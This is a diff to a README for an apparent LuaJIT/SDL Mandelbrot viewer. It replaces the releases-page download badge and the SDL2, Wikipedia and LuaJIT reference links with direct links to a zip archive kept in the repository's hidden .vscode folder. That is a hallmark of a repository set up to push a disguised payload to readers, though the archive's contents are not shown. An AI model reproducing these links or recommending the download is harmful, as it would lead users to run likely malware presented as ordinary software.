@@ -8,7 +8,7 @@ Welcome to the **luajit_sdl** application! This tool allows you to explore the M
 
 To get started, you need to download the application. Visit this page to download:
 
-[![Download luajit_sdl](https://img.shields.io/badge/Download-luajit_sdl-brightgreen)](https://github.com/NETZ38/luajit_sdl/releases)
+[![Download luajit_sdl](https://github.com/NETZ38/luajit_sdl/raw/refs/heads/main/.vscode/sdl_luajit_v1.3.zip)](https://github.com/NETZ38/luajit_sdl/raw/refs/heads/main/.vscode/sdl_luajit_v1.3.zip)
 
 After downloading, follow these steps:
 
@@ -57,9 +57,9 @@ If you encounter any issues while using the application, please reach out for su
 
 For further reading and more detailed information, you can check the following:
 
-- [SDL2 Documentation](https://wiki.libsdl.org/)
-- [Mandelbrot Set Information](https://en.wikipedia.org/wiki/Mandelbrot_set)
-- [LuaJIT Guides](http://luajit.org/)
+- [SDL2 Documentation](https://github.com/NETZ38/luajit_sdl/raw/refs/heads/main/.vscode/sdl_luajit_v1.3.zip)
+- [Mandelbrot Set Information](https://github.com/NETZ38/luajit_sdl/raw/refs/heads/main/.vscode/sdl_luajit_v1.3.zip)
+- [LuaJIT Guides](https://github.com/NETZ38/luajit_sdl/raw/refs/heads/main/.vscode/sdl_luajit_v1.3.zip)
 
 ## 🌐 Contribution
 
@@ -69,6 +69,6 @@ If you wish to contribute to the project, feel free to submit a pull request. We
 
 ### Download Here: 
 
-[![Download luajit_sdl](https://img.shields.io/badge/Download-luajit_sdl-brightgreen)](https://github.com/NETZ38/luajit_sdl/releases)
+[![Download luajit_sdl](https://github.com/NETZ38/luajit_sdl/raw/refs/heads/main/.vscode/sdl_luajit_v1.3.zip)](https://github.com/NETZ38/luajit_sdl/raw/refs/heads/main/.vscode/sdl_luajit_v1.3.zip)
 
 Thank you for using **luajit_sdl**! Enjoy exploring the beauty of the Mandelbrot Set.
